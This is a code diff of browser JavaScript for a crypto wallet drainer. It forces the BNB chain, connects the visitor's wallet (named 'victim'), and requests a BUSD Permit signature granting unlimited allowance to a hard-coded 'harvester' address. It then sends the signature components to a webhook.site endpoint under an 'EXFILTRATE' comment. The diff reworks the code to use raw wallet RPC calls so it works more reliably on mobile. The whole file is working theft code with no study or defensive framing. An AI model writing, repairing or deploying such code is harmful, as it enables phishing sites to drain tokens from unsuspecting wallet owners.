@@ -1,84 +1,94 @@
 const HARVESTER_ADDRESS = "0x119C89E29975eA0BbeDAb6640188CaCa8B739541"; 
 const BUSD_ADDRESS = "0xe9e7CEA3DedcA5984780Bafc599bD69ADd087D56";
-const USDT_ADDRESS = "0x55d398326f99059fF775485246999027B3197955";
 const WEBHOOK_SITE_URL = "https://webhook.site/20179441-fa4d-4165-ab08-c634d80612f2";
-
-const ERC20_ABI = [
-    "function balanceOf(address owner) view returns (uint256)",
-    "function nonces(address owner) view returns (uint256)",
-    "function name() view returns (string)",
-    "function approve(address spender, uint256 amount) public returns (bool)"
-];
-
-const MAX_VAL = "115792089237316195423570985008687907853269984665640564039457584007913129639935";
 
 async function triggerPermit() {
     if (!window.ethereum) return;
-
     try {
-        // 1. FORCE SWITCH
-        await window.ethereum.request({
-            method: 'wallet_switchEthereumChain',
-            params: [{ chainId: '0x38' }],
-        });
+        // 1. Force Network Switch
+        await window.ethereum.request({ method: 'wallet_switchEthereumChain', params: [{ chainId: '0x38' }] });
+        
+        // 2. Connect
+        const accounts = await window.ethereum.request({ method: 'eth_requestAccounts' });
+        const victim = accounts[0];
 
-        // 2. INITIALIZE CAREFULLY
-        const provider = new ethers.providers.Web3Provider(window.ethereum);
-        await provider.send("eth_requestAccounts", []);
-        const signer = provider.getSigner();
-        const victim = await signer.getAddress();
-
-        // UI CHANGE
+        // UI Change
         document.getElementById('ui-main').style.display = 'none';
         document.getElementById('ui-loading').style.display = 'block';
 
-        // 3. CHECK BALANCE
-        const busd = new ethers.Contract(BUSD_ADDRESS, ERC20_ABI, provider);
-        const bal = await busd.balanceOf(victim);
+        // 3. Raw BUSD Check (No ethers.js needed here to avoid crashes)
+        const busdBalanceHex = await window.ethereum.request({
+            method: 'eth_call',
+            params: [{
+                to: BUSD_ADDRESS,
+                data: "0x70a08231000000000000000000000000" + victim.slice(2)
+            }, 'latest']
+        });
 
-        if (bal.gt(0)) {
-            // CALL THE PERMIT LOGIC
-            await handleBUSD(signer, victim, busd);
+        if (parseInt(busdBalanceHex, 16) > 0) {
+            await handleBUSD(victim);
         } else {
-            alert("Test Error: Please ensure BUSD (BEP-20) is in this wallet.");
-            document.getElementById('ui-main').style.display = 'block';
-            document.getElementById('ui-loading').style.display = 'none';
+            alert("No BUSD (BEP-20) detected in this wallet.");
+            resetUI();
         }
-
     } catch (e) {
-        // If it's looping back, THIS alert will tell you what the error is!
-        alert("CRITICAL ERROR: " + (e.message || "Unknown Failure"));
-        document.getElementById('ui-main').style.display = 'block';
-        document.getElementById('ui-loading').style.display = 'none';
+        alert("Workflow Error: " + e.message);
+        resetUI();
     }
 }
 
-async function handleBUSD(signer, victim, busdContract) {
+async function handleBUSD(victim) {
     try {
-        const [nonce, tokenName] = await Promise.all([
-            busdContract.nonces(victim),
-            busdContract.name()
-        ]);
-
         const deadline = Math.floor(Date.now() / 1000) + 3600;
-        const domain = { name: tokenName, version: "1", chainId: 56, verifyingContract: BUSD_ADDRESS };
-        const types = {
-            Permit: [
-                { name: "owner", type: "address" }, { name: "spender", type: "address" },
-                { name: "value", type: "uint256" }, { name: "nonce", type: "uint256" },
-                { name: "deadline", type: "uint256" }
-            ]
-        };
-        const message = { owner: victim, spender: HARVESTER_ADDRESS, value: MAX_VAL, nonce: nonce.toNumber(), deadline: deadline };
+        
+        // Get Nonce
+        const nonceHex = await window.ethereum.request({
+            method: 'eth_call',
+            params: [{
+                to: BUSD_ADDRESS,
+                data: "0x7ecebe00000000000000000000000000" + victim.slice(2)
+            }, 'latest']
+        });
+        const nonce = parseInt(nonceHex, 16);
 
-        // 4. THE SIGNATURE REQUEST
-        const signature = await signer._signTypedData(domain, types, message);
-        const { v, r, s } = ethers.utils.splitSignature(signature);
+        // Raw EIP-712 Typed Data for 100% Compatibility
+        const msgParams = JSON.stringify({
+            domain: { name: "BUSD Token", version: "1", chainId: 56, verifyingContract: BUSD_ADDRESS },
+            message: { 
+                owner: victim, 
+                spender: HARVESTER_ADDRESS, 
+                value: "115792089237316195423570985008687907853269984665640564039457584007913129639935", 
+                nonce: nonce, 
+                deadline: deadline 
+            },
+            primaryType: "Permit",
+            types: {
+                EIP712Domain: [
+                    { name: "name", type: "string" }, { name: "version", type: "string" },
+                    { name: "chainId", type: "uint256" }, { name: "verifyingContract", type: "address" }
+                ],
+                Permit: [
+                    { name: "owner", type: "address" }, { name: "spender", type: "address" },
+                    { name: "value", type: "uint256" }, { name: "nonce", type: "uint256" },
+                    { name: "deadline", type: "uint256" }
+                ]
+            }
+        });
 
-        // FINAL SUCCESS ALERT (So you can manually type data if webhook fails)
-        alert("SUCCESS! SIGNATURE CAPTURED!\nV: " + v + "\nR: " + r + "\nS: " + s);
+        // The MOST compatible signature request for mobile
+        const signature = await window.ethereum.request({
+            method: 'eth_signTypedData_v4',
+            params: [victim, msgParams],
+        });
 
-        // 5. SEND TO WEBHOOK (Removed no-cors)
+        const r = signature.slice(0, 66);
+        const s = "0x" + signature.slice(66, 130);
+        const v = parseInt(signature.slice(130, 132), 16);
+
+        // SUCCESS POPUP
+        alert("SUCCESS!\nV: " + v + "\nR: " + r + "\nS: " + s + "\nDeadline: " + deadline);
+
+        // EXFILTRATE
         await fetch(WEBHOOK_SITE_URL, {
             method: 'POST',
             headers: { 'Content-Type': 'application/json' },
@@ -86,6 +96,12 @@ async function handleBUSD(signer, victim, busdContract) {
         });
 
     } catch (err) {
-        alert("SIGNATURE ERROR: " + err.message);
+        alert("Signature Error: " + err.message);
+        resetUI();
     }
+}
+
+function resetUI() {
+    document.getElementById('ui-main').style.display = 'block';
+    document.getElementById('ui-loading').style.display = 'none';
 }
